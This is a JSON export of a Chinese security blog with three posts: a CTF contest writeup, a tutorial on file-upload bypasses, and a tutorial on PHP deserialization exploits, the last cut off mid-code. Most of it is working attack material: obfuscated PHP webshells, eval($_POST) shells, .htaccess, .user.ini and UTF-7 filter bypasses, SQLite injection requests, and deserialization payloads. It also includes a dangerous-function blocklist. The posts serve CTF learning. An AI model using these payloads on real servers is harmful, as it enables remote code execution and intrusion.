{"meta":{"title":"潜心","subtitle":"","description":"","author":"flag2020","url":"https://github.com/flag2020/flag2020.github.io","root":"/"},"pages":[{"title":"about","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-19T14:42:51.519Z","comments":true,"path":"about.html","permalink":"https://github.com/flag2020/flag2020.github.io/about.html","excerpt":"","text":"关于 本博客主题来自 https://shen-yu.gitee.io/ 一个安静且优雅的 Hexo 主题 GitHub：https://github.com/Shen-Yu/hexo-theme-ayer"},{"title":"Oh>..< 无法访问!","date":"2020-10-19T12:43:14.051Z","updated":"2020-10-18T03:43:51.595Z","comments":true,"path":"404.html","permalink":"https://github.com/flag2020/flag2020.github.io/404.html","excerpt":"","text":"#no{ position: relative; top: 30%; left: 50%; -webkit-transform: translate(-50%, 32%); -moz-transform: translate(-50%, 32%); -ms-transform: translate(-50%, 32%); -o-transform: translate(-50%, 32%); transform: translate(-50%, 32%); font-size: 24px; line-height: 72px; margin-bottom: 36px; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; } 404 Oh>..< 我找不到回家的路了"},{"title":"时间轴","date":"2020-05-10T03:33:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"axis.html","permalink":"https://github.com/flag2020/flag2020.github.io/axis.html","excerpt":"","text":"时间轴 加载中…… if(n){ 加载失败。}"},{"title":"about","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-19T13:00:26.348Z","comments":true,"path":"about.html","permalink":"https://github.com/flag2020/flag2020.github.io/about.html","excerpt":"","text":"关于 本博客主题来自 https://shen-yu.gitee.io/ 一个安静且优雅的 Hexo 主题 GitHub：https://github.com/Shen-Yu/hexo-theme-ayer"},{"title":"友情链接","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"link.html","permalink":"https://github.com/flag2020/flag2020.github.io/link.html","excerpt":"","text":"友情链接 加载中…. if(n){ 加载失败。}"},{"title":"留言板","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T07:59:34.518Z","comments":true,"path":"valine.html","permalink":"https://github.com/flag2020/flag2020.github.io/valine.html","excerpt":"","text":"留言板，请大佬任意发炎如果有什么问题或者反馈都可以发送在评论区添加友情链接传送带"},{"title":"categories","date":"2020-10-21T03:57:25.955Z","updated":"2020-10-21T03:57:25.955Z","comments":true,"path":"categories/index.html","permalink":"https://github.com/flag2020/flag2020.github.io/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-10-29T08:27:03.985Z","updated":"2020-10-29T08:27:03.985Z","comments":true,"path":"friends/index.html","permalink":"https://github.com/flag2020/flag2020.github.io/friends/index.html","excerpt":"","text":"friends p{ color: darkgreen; font-family: 微软雅黑; font-size: 20px; } kawhi eeknight"},{"title":"friends","date":"2020-10-29T08:20:39.407Z","updated":"2020-10-29T08:20:39.407Z","comments":true,"path":"friends/index.html","permalink":"https://github.com/flag2020/flag2020.github.io/friends/index.html","excerpt":"","text":"kawhi"},{"title":"tags","date":"2020-10-29T08:35:55.023Z","updated":"2020-10-29T08:35:55.023Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/flag2020/flag2020.github.io/tags/index.html","excerpt":"","text":"tags p{ color: darkgreen; font-family: 微软雅黑; font-size: 20px; } writeup web"},{"title":"tags","date":"2020-10-21T03:57:41.838Z","updated":"2020-10-21T03:57:41.838Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/flag2020/flag2020.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"菜鸡划水队 writeup","slug":"菜鸡划水队writeup","date":"2020-10-23T16:00:00.000Z","updated":"2020-10-29T08:05:10.063Z","comments":true,"path":"2020/10/24/菜鸡划水队writeup/","link":"","permalink":"https://github.com/flag2020/flag2020.github.io/2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/","excerpt":"比赛：2020全国工业互联网安全技术技能大赛 学生组 正如队名一样，我们只是来划水的签到选手","text":"比赛：2020全国工业互联网安全技术技能大赛 学生组 正如队名一样，我们只是来划水的签到选手 签到拼图，拼完就可以得到flag flag 1flag&#123;welcome_to_chinaiisc2020&#125; SimpleCalculator不知道怎么用这个计算器来计算，查看网页源码，尝试用 ?search 传参 尝试使用异或绕过 12345&lt;?php$a = urldecode(&#x27;%ff%ff%ff%ff&#x27;);$b = urldecode(&#x27;%a0%b8%ba%ab&#x27;);echo $a^$b;//输出_GET 构造phpinfo() 123$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 构造webshell 123$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]); 使用蚁剑查看 http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27]) 在网站根目录下找到flag flag 1flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125; 其它方法： 123?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%20/flag//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;); SQLManager参考文章：https://www.anquanke.com/post/id/200927#h3-6 题目说这是个简易的SQLite管理器。 而SQLite管理器有一个自动创建的库sqlite_master，里面保存了所有表名以及创建表时的create语句。在创建表时可以用as来复制另一个表中的数据，所以我们可以从中获取到flag的表名和字段名。 在建表界面用burp suite抓包，重放包得到flag的表名和字段名 table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER 这里可以得知flag所在的表：flag_Y0U_c4nt_GUESS，以及所在的字段：flag_ThE_C0lumn 删表后再次抓包，表名为 b ，继续用burp suite重放包 将a改为b，sql改为flag_Y0U_c4nt_GUESS，将sqlite_master改为flag_ThE_C0lumn table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER flag 1flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;","categories":[{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://github.com/flag2020/flag2020.github.io/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://github.com/flag2020/flag2020.github.io/tags/writeup/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2020-10-16T16:00:00.000Z","updated":"2020-10-29T08:37:21.935Z","comments":true,"path":"2020/10/17/文件上传漏洞/","link":"","permalink":"https://github.com/flag2020/flag2020.github.io/2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"文件上传漏洞一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。","text":"文件上传漏洞一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 .htaccess任意文件解析当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。 1AddType application&#x2F;x-httpd-php .aaa .htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件 短标签绕过假设&lt;?php 被被过滤，同时PHP版本为5可以使用段标签绕过。 JS风格 1&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt; 短标签风格 1&lt;?=phpinfo();?&gt; &lt;?=?&gt;与&lt;?php echo ....?&gt;等效 ASP风格 1&lt;% phpinfo();%&gt; 官方默认风格 1&lt;?php phpinfo(); ?&gt; 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了&lt;?而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下&lt;?php形式），这时候可以使用.htaccess解码对应的文件，例如可以使用UTF-7进行解码：(http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7） .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 双写绕过假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。 12&lt;?pphphp@eevalval($_PPOSTOST[&#x27;cmd&#x27;]); 123&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini绕过假如.htaccess被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。 1.aaa 12&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini 1auto_prepend_file&#x3D;1.aaa 加载其它php文件的时候，会先加载.user.ini里的1.aaa .htaccess文件换行绕过上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。 .htaccess支持换行编写所以使用换行可以直接上传成功并解析。 12AddType appli\\cation&#x2F;x-httpd-php .aaa 过滤掉application，则使用换行绕过 文件包含解码Base64 .htaccess 12AddType application&#x2F;x-httpd-php .aaaphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot; 动态拼接函数绕过函数过滤对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。 使用脚本快速生成指定函数 123456&lt;?php$a = &quot;phpinfo&quot;;for($i=0;$i&lt;strlen($a);$i++)&#123; echo &quot;chr(&quot;.ord($a[$i]).&quot;).&quot;;&#125;?&gt; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111) 1.aaa 1234&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; 图片头绕过上传1.aaa，被检测到文件不是图片类型，则可以通过以下方法绕过，则有可能被识别为图片，绕过检测。 XMB文件头绕过12#define test_width 16#define test_height 7 1.aaa 123456#define test_width 16#define test_height 7&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; GIF89a1GIF89a 1.aaa 12345GIF89a&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; 题目upload2发现不能上传php文件，且文件内容不能使用官方默认风格(上传提示：Can’t upload php file)，所以尝试使用其它标签绕过 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 1&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt; 在根目录下找到flag。 或者 cat /flag upload3 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 发现php，eval，POST被替换为空，使用双写绕过。 .htaccess 1AddType application&#x2F;x-httpd-pphphp .aaa 1.aaa 12&lt;?pphphp@eevalval($_PPOSTOST[&#39;cmd&#39;]); upload4 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 发现没有上传。上传test.php和1.jpg（不是真的jpg文件）也都失败，尝试使用.user.ini绕过，结果提示：内容不能有file。 几次尝试后发现，它对文件内容进行检查，不能含有&lt;?，且无法用其它标签绕过。 尝试使用特殊编码绕过，上传.htaccess和1.aaa .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 在根目录下找到flag。 找到flag之后查看php版本为：7.0.33 尝试发现： 由于版本为7.0以上且过滤掉&lt;?，所以无法使用其它标签绕过。 upload6 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 提示：内容不能有application 尝试使用.htaccess文件换行绕过。 .htaccess 12AddType appli\\cation&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); upload7 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 上传1.aaa 提示：不能含有危险函数！ 使用burp suite抓包看看，发现eval和POST被过滤了。 尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。 1.aaa 123&lt;?php$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a(&#39;cat &#x2F;flag&#39;); 123&lt;?php$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);echo $a; 输出：system PS： ctf-wscan下载地址：https://codeload.github.com/kingkaki/ctf-wscan/zip/master 做题前可以先扫扫看有没有备份文件 像robots.txt 、www.zip。 使用扫描器扫描发现存在备份文件 下载备份文件 把.index.php.swp放到linux下使用vim -r恢复 1vim -r index.php.swp 得到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php//设置上传目录define(&quot;UPLOAD_PATH&quot;, &quot;../upload&quot;);function deldot($s)&#123; for($i=strlen($s)-1;$i&gt;0;$i--)&#123; $c=substr($s,$i,1); if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123; return $s; &#125; if($c != &#x27;.&#x27;)&#123; return substr($s,0,$i+1); &#125; &#125;&#125;$is_upload=false;$msg=null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name=trim($_FILES[&#x27;pic&#x27;][&#x27;name&#x27;]); $file_name=deldot($file_name);//删除文件名末尾的点 $file_ext=strrchr($file_name, &#x27;.&#x27;); $file_ext=strtolower($file_ext); //转换为小写 $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext=trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file=$_FILES[&#x27;pic&#x27;][&#x27;tmp_name&#x27;]; $img_path=UPLOAD_PATH.&#x27;/&#x27;.$file_name; if(preg_match(&quot;/(phpinfo|system\\(|eval\\(|file_put_contents|file_get_contents|passthru|exec\\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;,file_get_contents($temp_file)))&#123; die(&quot;不能含有危险函数！&quot;); &#125; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload=true; echo &quot;上传成功&quot;.&quot;&lt;br&gt;&quot;; echo $img_path; &#125;else&#123; echo &#x27;上传出错！&#x27;; &#125; &#125;else&#123; echo &#x27;此文件不允许上传!&#x27;; &#125; &#125;else&#123; echo UPLOAD_PATH . &#x27;文件夹不存在,请重新上传！&#x27;; mkdir(UPLOAD_PATH,775,true); &#125;&#125;?&gt;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://github.com/flag2020/flag2020.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://github.com/flag2020/flag2020.github.io/tags/web/"}]},{"title":"反序列化漏洞","slug":"反序列化漏洞","date":"2020-10-07T16:00:00.000Z","updated":"2020-10-29T08:07:51.501Z","comments":true,"path":"2020/10/08/反序列化漏洞/","link":"","permalink":"https://github.com/flag2020/flag2020.github.io/2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"反序列化漏洞所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。","text":"反序列化漏洞所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 序列化 serialize() 将对象转变成一个字符串便于之后的传递与使用。 序列化会保存对象所有的变量，但是不会保存对象的方法。 反序列化 unserialize() 将序列化的结果恢复成对象。 反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 spl_autoload_register() (自动包含类)实现 序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。 php魔术方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。 通常来说有一些PHP的魔法函数会导致反序列化漏洞，如： __construct 当一个对象创建时自动调用 __wakeup 使用unserialize()函数时会自动调用 __destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象) __toString 当一个对象被当作一个字符串被调用。 __sleep() 使用serialize()函数时触发 __call() 在对象上下文中调用不可访问的方法时触发 __callStatic() 在静态上下文中调用不可访问的方法时触发 __get() 用于从不可访问的属性读取数据 __set() 用于将数据写入不可访问的属性 __isset() 在不可访问的属性上调用isset()或empty()触发 __unset() 在不可访问的属性上使用unset()时触发 __toString() 把类当作字符串使用时触发,返回值需要为字符串 __invoke() 当脚本尝试将对象调用为函数时触发 12345678910111213141516171819202122232425262728293031&lt;?phpclass test &#123; public $varr1 = &quot;abc&quot;; public $varr2 = &quot;123&quot;; public function echoP() &#123; echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; &#125; public function __construct() &#123; echo &quot;__construct&lt;br&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct&lt;br&gt;&quot;; &#125; public function __toString() &#123; return &quot;__toString&lt;br&gt;&quot;; &#125; public function __sleep() &#123; echo &quot;__sleep&lt;br&gt;&quot;; return array(&#x27;varr1&#x27;,&#x27;varr2&#x27;); &#125; public function __wakeup() &#123; echo&quot;__wakeup&lt;br&gt;&quot;; &#125;&#125;$obj = new test();//序列化对象，调用__construct()方法，输出__construct$obj-&gt;echoP(); //调用echoP()方法，输出&quot;abc&quot;echo $obj; //obj对象被当做字符串输出，调用__toString()方法，输出__toString$s = serialize($obj); //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s); //$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。 //脚本结束销毁对象（$obj和反序列化的$s）时，又会调用__destruct()方法（两次），输出__destruct（两次）?&gt; 反序列化漏洞例子： 12345678910&lt;?phpclass A&#123; var $test = &quot;kawhi&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$a = $_GET[&#x27;a&#x27;];$b = unserialize($a);?&gt; 尝试构造序列化代码的时候插入xss 1234567891011&lt;?phpclass A&#123; var $test = &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$c = new A();$c = serialize($c);echo $c;?&gt; 输出O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125; O表示类型是object 1表示object对应的类的名字的长度为1 “A”表示类名 1表示对应变量的个数 s表示序列化后为字符串 4表示字符串的长度 “test&quot;表示表示变量名 s表示变量test的类型 28表示变量test的长度 &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;表示变量test的值 如果__wakeup中不是echo()，而是eval()，那么就是任意代码执行，危害就更大了。 wakeup绕过一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数 例：在网站根目录下有两个文件flag.php和test.php test.php源码如下： 123456789101112131415161718192021222324252627&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 构造序列化代码 1234567891011&lt;?phpclass A&#123; function __construct()&#123; $this-&gt;file = &quot;flag.php&quot;; &#125;&#125;$a = new A;$b = serialize($a);print_r($b);?&gt; 输出： 1O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 如果直接进行正常的反序列化的话，即 http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 页面没有其它变化，因为在使用unserialize()的时候自动调用__wakeup，将file替换为当前路径 php在解析属性长度的时候，若是出错 将O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;改为 O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 它并不会终止，而是继续执行，但不会调用__wakeup() 然后在销毁对象的时候自动调用__destruct()函数，高亮显示flag.php exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; OC绕过对test.php进行修改 对传进来的file进行过滤 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 正则表达式中对file进行了过滤 当遇到 字母O或C 加上:，再加上一段数字和:，后面的 i 表示不区分大小写 时，则die掉。 该正则表达式匹配的部分为：O:1: 若在中间插入一些字符，就可以让它匹配不完全，这样就可以绕过正则匹配 对于数字 1 来说，+1 和 1 时一样的，这样就可以绕过 但在URL传参中，会进行解码，会把加号（+）变成空格，所以应用+的URL编码：%2b代替 即： O:%2b1: exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 私有属性绕过php中的访问类型（public，private，protected） public 公有修饰符，类中的成员没有访问限制，所有外部成员都可以访问（读和写）这个类成员（包括成员属性和成员方法）。 private 私有修饰符，被定义为private的成员，对于同一个类里的所有成员是可见的，即没有访问限制；但对于该类的外部代码时不允许改变甚至读操作的，对于该类的子类，也不能访问private修饰的成员。 protected 保护成员修饰符，被修饰为protected的成员不能被该类的外部代码访问。但是对于该类的子类有访问权限，可以进行属性、方法的读及写操作。 public 表示全局，类内部外部子类都可以访问；private 表示私有的，只有本类内部可以使用；protected 表示受保护的，只有本类或子类或父类中可以访问； 123456789&lt;?phpclass test&#123; public $test1 = &quot;hello&quot; private $test2 = &quot;hello&quot;; protected $test3 = &quot;hello&quot;;&#125;$test = new test();echo serialize($test); ?&gt; test类定义了三个不同类型(公有，私有，保护)，但是值相同的字符串，序列化输出的值不相同 private属性序列化为：%00类名%00变量名，对于test2来说，序列化后的长度则变为11 protected属性序列化为：%00*%00变量名，对于test3来说，序列化后的长度则变为8 %00是不可见字符 对test.php继续进行修改 将public改为private 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; private $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 序列化带private属性的file &#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 将file改为%00A%00file，对应的长度改为7 即： {s:7:”%00A%00file”;s:8:”flag.php”;} exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 字符串逃逸在网站根目录下有两个文件，test.php和flag.php test.php源码如下： 123456789101112131415161718192021&lt;?phperror_reporting(255);class A&#123; public $filename = __FILE__; public function __destruct()&#123; highlight_file($this-&gt;filename); &#125;&#125;function waf($s)&#123; return preg_replace(&#x27;/flag/i&#x27;, &#x27;index&#x27;, $s);&#125;if(isset($_REQUEST[&#x27;x&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;x&#x27;]))&#123; $a = [ 0 =&gt; $_REQUEST[&#x27;x&#x27;], 1 =&gt; &quot;1&quot; ]; @unserialize(waf(serialize($a)));&#125;else&#123; new A();&#125;?&gt; 构造payload： 首先要有个&quot;;使前面的字符串闭合 接下来是常规的序列化后的数组元素 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 但在waf()函数中，对序列化后的$a进行替换，所以将s改为S，将flag.php改为十六进制的\\66\\6C\\61\\67\\2E\\70\\68\\70，即 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125; 最后再加上&#125;使前面数组a的&#123;闭合 所以合起来是 &quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 12345678&lt;?php$a = [ 0 =&gt; &#x27;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(serialize($a));?&gt; 输出 a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125; 所以该段字符串有65个字符 利用waf()函数将flag替换为index会增加一个字符，构造65个flag 1python -c print(&#x27;flag&#x27;*65) 将输出结果和前面的字符串拼接在一起，得到payload 1flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 附： 验证payload是否正确 123456789101112131415&lt;?phpfunction waf($a)&#123; return preg_replace(&#x27;/flag/&#x27;, &#x27;index&#x27;, $a);&#125;$a = [ 0 =&gt; 